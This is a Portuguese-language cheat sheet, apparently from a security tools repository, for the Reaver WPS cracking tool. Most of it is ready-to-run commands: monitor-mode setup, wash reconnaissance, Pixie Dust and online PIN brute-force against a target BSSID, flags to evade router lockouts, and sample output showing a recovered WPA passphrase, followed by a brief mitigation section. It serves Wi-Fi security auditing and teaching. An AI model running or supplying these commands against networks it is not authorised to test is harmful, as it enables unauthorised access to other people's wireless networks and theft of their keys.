<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Folha de dicas do Reaver

[Reaver](https://github.com/t6x/reaver-wps-fork-t6x) é uma ferramenta especializada de auditoria de segurança de Wi-Fi projetada para executar ataques de força bruta contra PINs de registrador de Wi-Fi Protected Setup (WPS). Ao recuperar o PIN WPS de 8 dígitos, o Reaver recupera a chave pré-compartilhada (PSK) WPA/WPA2 de texto simples. Ele também suporta ataques offline de Pixie Dust via `pixiewps`.

---

## Índice

- [Mecânica de vulnerabilidade WPS](#wps-vulnerability-mechanics)
- [Instalação (`reaver` e `pixiewps`)](#installation-reaver--pixiewps)
- [Reconhecimento: Identificando redes WPS (`wash`)](#reconnaissance-identifying-wps-networks-wash)
- [Pixie Dust Attack (recuperação instantânea de chave)](#pixie-dust-attack-instant-key-recovery)
- [Força bruta WPS PIN on-line completa] (#full-online-wps-pin-brute-force)
- [Limitação de taxa de AP e tratamento de bloqueio](#ap-rate-limiting--lockout-handling)
- [Mitigação Defensiva](#mitigação-defensiva)

---

## Mecânica de vulnerabilidade WPS

A autenticação WPS PIN usa um PIN de 8 dígitos dividido em duas metades:
- A primeira metade tem 4 dígitos ($10^4 = 10.000$ possibilidades).
- A segunda metade tem 3 dígitos + 1 dígito de soma de verificação ($10^3 = 1.000$ possibilidades).
- Em vez de testar combinações de $10^8 = 100.000.000$, um invasor testa apenas no máximo $10.000 + 1.000 = 11.000$ tentativas.
- **Pixie Dust Attack:** Explora PRNG (geradores de números pseudo-aleatórios) fracos em chipsets sem fio específicos (Ralink, MediaTek, Realtek, Broadcom) para calcular o PIN WPS offline em segundos a partir de apenas 2 pacotes iniciais.

---

## Instalação (`reaver` e `pixiewps`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y reaver pixiewps bully

# Arch Linux / BlackArch
sudo pacman -S reaver pixiewps

# Verify command
reaver -h
```
---

## Reconhecimento: Identificando Redes WPS (`wash`)

Antes de iniciar o Reaver, encontre pontos de acesso com WPS habilitados e verifique se estão bloqueados:
```bash
# Put wireless interface into monitor mode
sudo airmon-ng start wlan0
# or:
sudo iw dev wlan0 set type monitor

# Scan for WPS-enabled routers using wash
sudo wash -i wlan0mon
```
Colunas principais a serem observadas:
- **`WPS Locked`**: Se for `Yes`, o roteador bloqueou tentativas de PIN WPS devido a atividades anteriores de força bruta. Roteadores de destino mostrando `No`.
- **`WPS Ver`**: versão WPS (1.0 ou 2.0).
- **`ESSID` e `BSSID`**: nome da rede de destino e MAC.

---

## Pixie Dust Attack (recuperação instantânea de chave)

O ataque Pixie Dust (`-K 1`) é o ataque mais rápido contra WPS. Ele coleta E-Hash1, E-Hash2 e nonces do roteador e quebra o PIN offline sem acionar limites de taxa:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv
```
- `-i wlan0mon`: Interface do modo monitor.
- `-b <bssid>`: MAC do roteador de destino.
- `-c 6`: Canal do AP alvo.
- `-K 1`: Execute o ataque automático Pixie Dust via `pixiewps`.
- `-vv`: Saída detalhada.

*Se estiver vulnerável, o PIN e o WPA PSK serão impressos em menos de 10 segundos.*

---

## PIN WPS on-line completo de força bruta

Se Pixie Dust falhar, volte para a força bruta online:
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv
```
Assim que o PIN for descoberto, o Reaver exibirá:
```text
[+] Pin cracked in 4520 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'SuperSecretWiFiPassword'
[+] AP SSID: 'Target_Network'
```
---

## Limitação de taxa de AP e tratamento de bloqueio

Muitos roteadores modernos bloqueiam tentativas de WPS por 5 a 15 minutos após 3 a 5 tentativas fracassadas. Use sinalizadores de atraso e nova tentativa de ajuste:
```bash
# Delay 10 seconds between attempts
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 10 -vv

# Wait 300 seconds if the router locks WPS
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 5 --lock-delay=300 -vv

# Ignore NACK packets and keep trying
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 --ignore-locks -vv
```
### Alternativa: Usando `bully`
`bully` é uma implementação C rápida do ataque WPS que lida bem com implementações estranhas de roteadores:
```bash
sudo bully -b 00:11:22:33:44:55 -c 6 --pixiewps wlan0mon
```
---

## Mitigação Defensiva

- **Desative totalmente o WPS:** A recomendação mais segura é desligar o WPS na interface web do roteador.
- **Atualização de firmware:** Roteadores modernos implementam limitação estrita de taxa, espera exponencial e corrigem falhas de entropia PRNG exploradas pelo Pixie Dust.
**Use WPA3:** WPA3 remove totalmente o WPS legado baseado em PIN, substituindo-o pelo Wi-Fi Easy Connect (DPP) seguro.